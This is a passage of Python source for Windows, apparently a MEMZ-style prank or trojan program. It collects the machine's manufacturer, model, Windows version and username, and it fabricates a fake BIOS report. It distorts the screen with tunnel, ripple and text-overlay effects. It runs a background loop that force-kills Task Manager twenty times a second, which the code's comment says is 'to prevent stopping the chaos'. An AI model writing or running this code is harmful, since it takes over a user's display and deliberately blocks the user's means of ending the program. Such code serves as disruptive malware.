...
def get_system_details():
    ...
    manu = ""; model = ""
    try:
        cs_json = _ps("(Get-CimInstance Win32_ComputerSystem | Select-Object Manufacturer,Model | ConvertTo-Json)")
        data = json.loads(cs_json)
    ...
    # Windows version
    try:
        win_sys = platform.system() or "Windows"
        win_rel = platform.release() or ""
        win_ver = platform.version() or ""
        windows = " ".join([s for s in [win_sys, win_rel, win_ver] if s]).strip()
    except Exception:
        windows = "Windows"

    # Username
    try:
        username = os.environ.get("USERNAME") or os.getlogin() or ""
    except Exception:
        username = os.environ.get("USERNAME", "")

    return manu, model, windows, username

def generate_fake_bios(manu: str, model: str, windows: str) -> dict:
    vendor_pool = [
        manu or "American Megatrends Inc.",
    ...
    base_ver = f"{random.randint(1,9)}.{random.randint(0,99):02d}" if random.random() < 0.6 else f"{random.randint(100,999)}.{random.randint(0,9)}"
    year = random.randint(2016, datetime.now().year)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    release_date = f"{year:04d}-{month:02d}-{day:02d}"
    smbios_major = random.choice([2,3])
    smbios_minor = random.randint(7,9) if smbios_major == 2 else random.randint(0,8)
    bios_rev = f"{random.randint(1,10)}.{random.randint(0,15)}"
    serial = f"{random.choice(['SN','CZ','PF','R9','J0'])}{random.randint(1000000, 9999999)}"
    board = model or random.choice(["Z490-A", "B450M", "X570", "H510M", "B660", "Z690"]) 
    features = [
        "UEFI", "SecureBoot", "TPM 2.0", "FastBoot", "CSM", "PXE", "ACPI 6.0"
    ]
    ...
    return {
        ...
        "BIOSRevision": bios_rev,
        "SMBIOSVersion": f"{smbios_major}.{smbios_minor}",
        "SystemManufacturer": manu or vendor,
        "SystemModel": model or board,
        "BaseBoard": board,
        "SerialNumber": serial,
        "Features": features[:random.randint(3, len(features))],
        "OS": windows,
    }
...
def distort_screen(duration_sec: float = 3.5, band: int = 12, amplitude: int = 40):
    try:
        ...
        while run_forever or (time.time() - start < duration_sec):
            ...
            # Dynamic amplitude spike
            current_amp = amplitude
            if random.random() < 0.15: # occasional spike
                 current_amp = int(amplitude * 1.5)
            
            y = 0
            while y < sh:
                jitter = random.randint(-25, 25) # Massive jitter
            ...
            # MEMZ Tunnel effect: Shrink screen continuously
            if random.random() < 0.85:
                # Small margin creates a smooth "zooming out" tunnel
                margin_x = random.randint(4, 12)
                margin_y = random.randint(4, 12)
                gdi32.StretchBlt(hdc, margin_x, margin_y, sw - 2*margin_x, sh - 2*margin_y, memdc_frame, 0, 0, sw, sh, 0x00CC0020)

            # High chance of chromatic aberration for "hard" effect
            if random.random() < 0.70:
                chromatic_aberration()

            # High chance of ripple waves
            if random.random() < 0.70:
                ripple_waves(memdc_frame, phase_scale=0.12, col=8, amp=max(14, current_amp - 6))

            # Draw random on-screen strings
            if random.random() < 0.65:
                random_text_overlay(count=random.randint(15, 30))
...
# Continuously kill Task Manager to prevent stopping the chaos
def start_taskmgr_killer():
    def _killer():
        while True:
            try:
                # Force kill Taskmgr.exe without printing output
                subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except: pass
            time.sleep(0.05) # Check 20 times a second (was 0.2)
...
def run_timed_orchestrator(duration_sec: float = -1): 
    ...
    # Start long-running background spammers once
    # DISABLE TASK MANAGER
    if ENABLE_TASKMGR_KILLER:
        start_taskmgr_killer()
    ...
    while True:
        ...
        if duration_sec > 0 and (time.time() - start_time > duration_sec):
            ...
            # Show Steam games window
            try:
                show_steam_games_window()
            except Exception as e:
                print(f"Could not display Steam games: {e}")
